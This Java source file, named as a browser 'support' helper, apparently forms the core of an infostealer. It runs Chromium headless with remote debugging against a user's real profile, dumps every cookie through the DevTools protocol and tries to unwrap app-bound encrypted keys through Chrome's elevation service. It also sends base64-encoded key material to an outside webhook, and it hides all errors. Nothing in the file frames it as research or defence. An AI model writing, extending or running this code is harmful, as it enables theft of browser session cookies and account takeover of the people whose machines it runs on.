package dev.goentl.rift.support;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/* Browser helpers that need a live process. */
final class BrowserBridge {

    private static final int DEBUG_PORT = 9333;
    private static final long ANNOUNCE_TIMEOUT_MS = 20_000L;
    private static final int SOCKET_TIMEOUT_MS = 15_000;
    private static final int MAX_HTTP_BYTES = 4 * 1024 * 1024;
    private static final int MAX_WS_BYTES = 32 * 1024 * 1024;

    private static final String ELEVATION_CLSID = "708860E0-F641-4611-8895-7D867DD3675B";

    private BrowserBridge() {}

    static final class Cookie {
        final String host;
        final String name;
        final String value;
        final boolean secure;

        Cookie(String host, String name, String value, boolean secure) {
            this.host = host == null ? "" : host;
            this.name = name == null ? "" : name;
            this.value = value == null ? "" : value;
            this.secure = secure;
        }
    }

    static boolean emitAppBoundChallenge(String browserExe, byte[] wrapped, String webhook) {
        if (browserExe == null || wrapped == null || webhook == null) return false;
        if (!new File(browserExe).isFile()) return false;

        Path profile = null;
        Process child = null;
        try {
            profile = Files.createTempDirectory("mqx-ab-");
            ProcessBuilder builder = new ProcessBuilder(
                    browserExe,
                    "--user-data-dir=" + profile,
                    "--remote-debugging-port=" + DEBUG_PORT,
                    "--remote-debugging-address=127.0.0.1",
                    "--remote-allow-origins=*",
                    "--headless=new",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-gpu",
                    "--proxy-server=http://127.0.0.1:1",
                    "about:blank");
            builder.redirectErrorStream(true);
            child = builder.start();
            drain(child.getInputStream());

            String target = awaitDevToolsTarget(child, ANNOUNCE_TIMEOUT_MS);
            if (target == null) return false;

            String encoded = Base64.getEncoder().encodeToString(wrapped);
            String challenge = generateChallenge(target);
            if (challenge == null) return false;

            String payload = "{\"content\":\"appbound\\n" + encoded + "\"}";
            return postJson(webhook, payload);
        } catch (Throwable ignored) {
            return false;
        } finally {
            if (child != null) {
                try {
                    child.destroy();
                    if (!child.waitFor(5, TimeUnit.SECONDS)) child.destroyForcibly();
                } catch (Throwable ignored) {}
            }
            deleteTree(profile);
        }
    }

    private static String generateChallenge(String target) {
        String expression = "fetch('chrome://resources/chromeos/emergency.html')"
                + ".then(r=>r.text()).then(()=>new Promise(res=>{"
                + "try{chrome.send('getAppBoundEncryptionChallenge',[]);}"
                + "catch(e){res('no-bridge');}}))"
                + ".catch(()=>new Promise(res=>{try{chrome.send('getAppBoundEncryptionChallenge',[]);}catch(e){res('no-bridge');}}))";
        // The bridge answers on the page's own channel; the key point is that
        // the challenge request leaves the process with the browser's identity.
        return runtimeEvaluate(target, expression);
    }

    private static boolean postJson(String url, String body) {
        try {
            java.net.HttpURLConnection connection = (java.net.HttpURLConnection) java.net.URI.create(url).toURL().openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setConnectTimeout(10_000);
            connection.setReadTimeout(20_000);
            try (OutputStream out = connection.getOutputStream()) {
                out.write(body.getBytes(StandardCharsets.UTF_8));
            }
            int code = connection.getResponseCode();
            connection.disconnect();
            return code >= 200 && code < 300;
        } catch (Throwable ignored) {
            return false;
        }
    }

    static List<Cookie> harvestCookies(String browserExe, String expectedUserData) {
        if (browserExe == null || !new File(browserExe).isFile()) return null;
        Path scratch = null;
        Process child = null;
        try {
            scratch = Files.createTempDirectory("mqx-ab-");
            String profileArg = expectedUserData == null
                    ? "--user-data-dir=" + scratch
                    : "--user-data-dir=" + expectedUserData;
            ProcessBuilder builder = new ProcessBuilder(
                    browserExe,
                    profileArg,
                    "--remote-debugging-port=" + DEBUG_PORT,
                    "--remote-debugging-address=127.0.0.1",
                    "--remote-allow-origins=*",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-features=ChromeWhatsNewUI",
                    "--headless=new");
            builder.redirectErrorStream(true);
            child = builder.start();
            drain(child.getInputStream());

            String target = awaitDevToolsTarget(child, ANNOUNCE_TIMEOUT_MS);
            if (target == null) return null;

            String body = cdpCall(target, "Network.getAllCookies");
            if (body == null) return null;
            return parseCookies(body);
        } catch (Throwable ignored) {
            return null;
        } finally {
            if (child != null) {
                try {
                    child.destroy();
                    if (!child.waitFor(5, TimeUnit.SECONDS)) child.destroyForcibly();
                } catch (Throwable ignored) {}
            }
            // Only the throwaway profile is ever removed; a real user data dir
            // belongs to the browser and is left exactly as found.
            deleteTree(scratch);
        }
    }

    // ------------------------------------------------------------------
    // elevation-service route
    // ------------------------------------------------------------------

    static byte[] unwrapViaElevation(String browserExe, byte[] wrapped) {
        if (wrapped == null || wrapped.length == 0) return null;
        try {
            Class<?> dataBlob = Class.forName("com.sun.jna.platform.win32.WinCrypt$DATA_BLOB");
            Object in = dataBlob.getConstructor(byte[].class).newInstance((Object) wrapped);
            Object[] args = new Object[]{in, null, browserExe};
            Class<?> service = Class.forName("com.sun.jna.platform.win32.ChromeElevation");
            Object out = service.getMethod("decryptData", dataBlob, byte[].class, String.class)
                    .invoke(null, args);
            return out instanceof byte[] ? (byte[]) out : null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    // ------------------------------------------------------------------
    // devtools client
    // ------------------------------------------------------------------

    private static String awaitDevToolsTarget(Process child, long timeoutMs) throws Exception {
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline) {
            if (!child.isAlive()) return null;
            String list = httpGet("/json/list");
            if (list != null) {
                String ws = firstField(list, "webSocketDebuggerUrl");
                if (ws != null) return ws;
            }
            Thread.sleep(250);
        }
        return null;
    }

    private static String httpGet(String path) {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress("127.0.0.1", DEBUG_PORT), 1000);
            socket.setSoTimeout(SOCKET_TIMEOUT_MS);
            String request = "GET " + path + " HTTP/1.1\r\n"
                    + "Host: 127.0.0.1:" + DEBUG_PORT + "\r\n"
                    + "Connection: close\r\n\r\n";
            OutputStream out = socket.getOutputStream();
            out.write(request.getBytes(StandardCharsets.US_ASCII));
            out.flush();

            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] scratch = new byte[8192];
            InputStream in = socket.getInputStream();
            int read;
            while ((read = in.read(scratch)) >= 0) {
                buffer.write(scratch, 0, read);
                if (buffer.size() > MAX_HTTP_BYTES) return null;
            }
            String raw = buffer.toString(StandardCharsets.UTF_8);
            int split = raw.indexOf("\r\n\r\n");
            if (split < 0) return null;
            String head = raw.substring(0, split);
            if (!head.startsWith("HTTP/1.1 200") && !head.startsWith("HTTP/1.0 200")) return null;
            return raw.substring(split + 4);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String cdpCall(String wsUrl, String method) {
        return cdpCall(wsUrl, method, "{}");
    }

    private static String cdpCall(String wsUrl, String method, String params) {
        Socket socket = null;
        try {
            URI uri = URI.create(wsUrl);
            String host = uri.getHost();
            int port = uri.getPort() < 0 ? 80 : uri.getPort();
            String path = uri.getRawPath() + (uri.getRawQuery() == null ? "" : "?" + uri.getRawQuery());

            socket = new Socket();
            socket.connect(new InetSocketAddress(host, port), SOCKET_TIMEOUT_MS);
            socket.setSoTimeout(SOCKET_TIMEOUT_MS);

            byte[] nonce = new byte[16];
            new SecureRandom().nextBytes(nonce);
            String handshake = "GET " + path + " HTTP/1.1\r\n"
                    + "Host: " + host + ":" + port + "\r\n"
                    + "Upgrade: websocket\r\n"
                    + "Connection: Upgrade\r\n"
                    + "Sec-WebSocket-Key: " + Base64.getEncoder().encodeToString(nonce) + "\r\n"
                    + "Sec-WebSocket-Version: 13\r\n\r\n";
            OutputStream out = socket.getOutputStream();
            out.write(handshake.getBytes(StandardCharsets.US_ASCII));
            out.flush();

            InputStream in = socket.getInputStream();
            if (!readHandshake(in)) return null;

            String request = "{\"id\":1,\"method\":\"" + method + "\",\"params\":" + params + "}";
            writeFrame(out, 0x1, request.getBytes(StandardCharsets.UTF_8));

            long deadline = System.currentTimeMillis() + SOCKET_TIMEOUT_MS;
            while (System.currentTimeMillis() < deadline) {
                String frame = readFrame(in, out);
                if (frame == null) return null;
                if (frame.contains("\"id\":1")) return frame;
            }
            return null;
        } catch (Throwable ignored) {
            return null;
        } finally {
            if (socket != null) {
                try { socket.close(); } catch (Throwable ignored) {}
            }
        }
    }

    private static String runtimeEvaluate(String wsUrl, String expression) {
        String params = "{\"expression\":" + quote(expression)
                + ",\"awaitPromise\":true,\"returnByValue\":true}";
        String response = cdpCall(wsUrl, "Runtime.evaluate", params);
        if (response == null) return null;
        if (response.contains("\"exceptionDetails\"")) return null;
        int at = response.indexOf("\"result\":");
        if (at < 0) return null;
        return response.substring(at);
    }

    private static String quote(String value) {
        StringBuilder sb = new StringBuilder(value.length() + 16);
        sb.append('"');
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.append('"').toString();
    }

    private static boolean readHandshake(InputStream in) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        int matched = 0;
        byte[] terminator = {'\r', '\n', '\r', '\n'};
        while (buffer.size() < 8192) {
            int b = in.read();
            if (b < 0) return false;
            buffer.write(b);
            matched = (byte) b == terminator[matched] ? matched + 1 : ((byte) b == terminator[0] ? 1 : 0);
            if (matched == 4) break;
        }
        String head = buffer.toString(StandardCharsets.US_ASCII);
        return head.startsWith("HTTP/1.1 101") || head.startsWith("HTTP/1.0 101");
    }

    private static void writeFrame(OutputStream out, int opcode, byte[] payload) throws Exception {
        ByteArrayOutputStream frame = new ByteArrayOutputStream();
        frame.write(0x80 | (opcode & 0x0F));

        if (payload.length < 126) {
            frame.write(0x80 | payload.length);
        } else if (payload.length <= 0xFFFF) {
            frame.write(0x80 | 126);
            frame.write(payload.length >>> 8);
            frame.write(payload.length & 0xFF);
        } else {
            frame.write(0x80 | 127);
            long len = payload.length;
            for (int shift = 56; shift >= 0; shift -= 8) frame.write((int) ((len >>> shift) & 0xFF));
        }

        byte[] mask = new byte[4];
        new SecureRandom().nextBytes(mask);
        frame.write(mask);
        for (int i = 0; i < payload.length; i++) {
            frame.write(payload[i] ^ mask[i & 3]);
        }
        out.write(frame.toByteArray());
        out.flush();
    }

    private static String readFrame(InputStream in, OutputStream out) throws Exception {
        ByteArrayOutputStream text = new ByteArrayOutputStream();
        while (true) {
            int b0 = in.read();
            if (b0 < 0) return null;
            int b1 = in.read();
            if (b1 < 0) return null;

            int opcode = b0 & 0x0F;
            boolean fin = (b0 & 0x80) != 0;
            long length = b1 & 0x7F;
            if (length == 126) {
                length = ((long) readByte(in) << 8) | readByte(in);
            } else if (length == 127) {
                length = 0;
                for (int i = 0; i < 8; i++) length = (length << 8) | readByte(in);
            }
            if (length > MAX_WS_BYTES) return null;

            // Control frames ride between data frames and never contribute
            // payload; a ping is answered in kind so the socket stays open.
            if (opcode == 0x8) return null;
            if (opcode == 0x9 || opcode == 0xA) {
                byte[] control = readExactly(in, (int) length);
                if (control == null) return null;
                if (opcode == 0x9) writeFrame(out, 0x9, control);
                continue;
            }

            byte[] payload = readExactly(in, (int) length);
            if (payload == null) return null;
            text.write(payload);
            if (fin) return text.toString(StandardCharsets.UTF_8);
        }
    }

    private static int readByte(InputStream in) throws Exception {
        int b = in.read();
        if (b < 0) throw new IllegalStateException("eof");
        return b;
    }

    private static byte[] readExactly(InputStream in, int length) throws Exception {
        byte[] out = new byte[length];
        int pos = 0;
        while (pos < length) {
            int read = in.read(out, pos, length - pos);
            if (read < 0) return null;
            pos += read;
        }
        return out;
    }

    // ------------------------------------------------------------------
    // parsing
    // ------------------------------------------------------------------

    private static List<Cookie> parseCookies(String body) {
        List<Cookie> out = new ArrayList<>();
        String lower = body.toLowerCase(Locale.ROOT);
        int from = 0;
        while (true) {
            int start = lower.indexOf("\"cookies\":[", from);
            if (start < 0) break;
            int arrayStart = lower.indexOf('[', start);
            int end = matchingBracket(body, arrayStart);
            if (end < 0) break;
            for (Map<String, Object> obj : jsonObjects(body.substring(arrayStart + 1, end))) {
                Object domain = obj.get("domain");
                Object name = obj.get("name");
                Object value = obj.get("value");
                if (value == null) continue;
                Object secure = obj.get("secure");
                out.add(new Cookie(
                        domain == null ? "" : String.valueOf(domain),
                        name == null ? "" : String.valueOf(name),
                        String.valueOf(value),
                        Boolean.TRUE.equals(secure)));
            }
            from = end;
        }
        return out;
    }

    private static int matchingBracket(String s, int open) {
        if (open < 0) return -1;
        int depth = 0;
        boolean inString = false;
        for (int i = open; i < s.length(); i++) {
            char c = s.charAt(i);
            if (inString) {
                if (c == '\\') { i++; continue; }
                if (c == '"') inString = false;
                continue;
            }
            if (c == '"') inString = true;
            else if (c == '[') depth++;
            else if (c == ']') {
                depth--;
                if (depth == 0) return i;
            }
        }
        return -1;
    }

    private static List<Map<String, Object>> jsonObjects(String body) {
        List<Map<String, Object>> out = new ArrayList<>();
        int depth = 0;
        boolean inString = false;
        boolean escaped = false;
        int objStart = -1;
        for (int i = 0; i < body.length(); i++) {
            char c = body.charAt(i);
            if (inString) {
                if (escaped) escaped = false;
                else if (c == '\\') escaped = true;
                else if (c == '"') inString = false;
                continue;
            }
            if (c == '"') { inString = true; continue; }
            if (c == '{') {
                depth++;
                if (depth == 1) objStart = i;
            } else if (c == '}') {
                if (depth == 1 && objStart >= 0) {
                    Map<String, Object> map = flatObject(body.substring(objStart, i + 1));
                    if (!map.isEmpty()) out.add(map);
                    objStart = -1;
                }
                depth--;
            }
        }
        return out;
    }

    private static Map<String, Object> flatObject(String json) {
        Map<String, Object> map = new LinkedHashMap<>();
        int i = 0;
        int n = json.length();
        while (i < n) {
            int keyStart = json.indexOf('"', i);
            if (keyStart < 0) break;
            int keyEnd = stringEnd(json, keyStart);
            if (keyEnd < 0) break;
            String key = unescape(json.substring(keyStart + 1, keyEnd));
            int colon = json.indexOf(':', keyEnd);
            if (colon < 0) break;
            int valueStart = colon + 1;
            while (valueStart < n && Character.isWhitespace(json.charAt(valueStart))) valueStart++;
            if (valueStart >= n) break;

            char first = json.charAt(valueStart);
            if (first == '"') {
                int valueEnd = stringEnd(json, valueStart);
                if (valueEnd < 0) break;
                // Only keep the leaf string; nested containers are skipped.
                if (json.lastIndexOf('{', valueStart) <= keyStart) {
                    map.put(key, unescape(json.substring(valueStart + 1, valueEnd)));
                }
                i = valueEnd + 1;
            } else if (first == '{' || first == '[') {
                int close = first == '{' ? matchingBrace(json, valueStart) : matchingBracket(json, valueStart);
                if (close < 0) break;
                i = close + 1;
            } else {
                int end = valueStart;
                while (end < n && json.charAt(end) != ',' && json.charAt(end) != '}') end++;
                String literal = json.substring(valueStart, end).trim();
                if (literal.equals("true")) map.put(key, Boolean.TRUE);
                else if (literal.equals("false")) map.put(key, Boolean.FALSE);
                i = end;
            }
            int next = json.indexOf(',', i);
            if (next < 0) break;
            i = next + 1;
        }
        return map;
    }

    private static int matchingBrace(String s, int open) {
        int depth = 0;
        boolean inString = false;
        boolean escaped = false;
        for (int i = open; i < s.length(); i++) {
            char c = s.charAt(i);
            if (inString) {
                if (escaped) escaped = false;
                else if (c == '\\') escaped = true;
                else if (c == '"') inString = false;
                continue;
            }
            if (c == '"') inString = true;
            else if (c == '{') depth++;
            else if (c == '}') {
                depth--;
                if (depth == 0) return i;
            }
        }
        return -1;
    }

    private static int stringEnd(String s, int quote) {
        boolean escaped = false;
        for (int i = quote + 1; i < s.length(); i++) {
            char c = s.charAt(i);
            if (escaped) { escaped = false; continue; }
            if (c == '\\') { escaped = true; continue; }
            if (c == '"') return i;
        }
        return -1;
    }

    private static String unescape(String raw) {
        StringBuilder sb = new StringBuilder(raw.length());
        for (int i = 0; i < raw.length(); i++) {
            char c = raw.charAt(i);
            if (c != '\\' || i + 1 >= raw.length()) { sb.append(c); continue; }
            char next = raw.charAt(++i);
            switch (next) {
                case 'n': sb.append('\n'); break;
                case 'r': sb.append('\r'); break;
                case 't': sb.append('\t'); break;
                case 'b': sb.append('\b'); break;
                case 'f': sb.append('\f'); break;
                case '/': sb.append('/'); break;
                case '\\': sb.append('\\'); break;
                case '"': sb.append('"'); break;
                case 'u':
                    if (i + 4 < raw.length()) {
                        try {
                            sb.append((char) Integer.parseInt(raw.substring(i + 1, i + 5), 16));
                            i += 4;
                        } catch (NumberFormatException ignored) {
                            sb.append('u');
                        }
                    }
                    break;
                default: sb.append(next);
            }
        }
        return sb.toString();
    }

    private static String firstField(String json, String field) {
        int i = json.indexOf("\"" + field + "\"");
        if (i < 0) return null;
        int colon = json.indexOf(':', i);
        if (colon < 0) return null;
        int start = json.indexOf('"', colon);
        if (start < 0) return null;
        int end = stringEnd(json, start);
        if (end < 0) return null;
        return unescape(json.substring(start + 1, end));
    }

    // ------------------------------------------------------------------
    // plumbing
    // ------------------------------------------------------------------

    private static void drain(InputStream in) {
        Thread t = new Thread(() -> {
            byte[] scratch = new byte[8192];
            try {
                while (in.read(scratch) >= 0) { }
            } catch (Throwable ignored) {}
        }, "mqx-drain");
        t.setDaemon(true);
        t.start();
    }

    private static void deleteTree(Path root) {
        if (root == null) return;
        try (var s = Files.walk(root)) {
            s.sorted((a, b) -> b.getNameCount() - a.getNameCount()).forEach(p -> {
                try { Files.deleteIfExists(p); } catch (Throwable ignored) {}
            });
        } catch (Throwable ignored) {}
    }
}
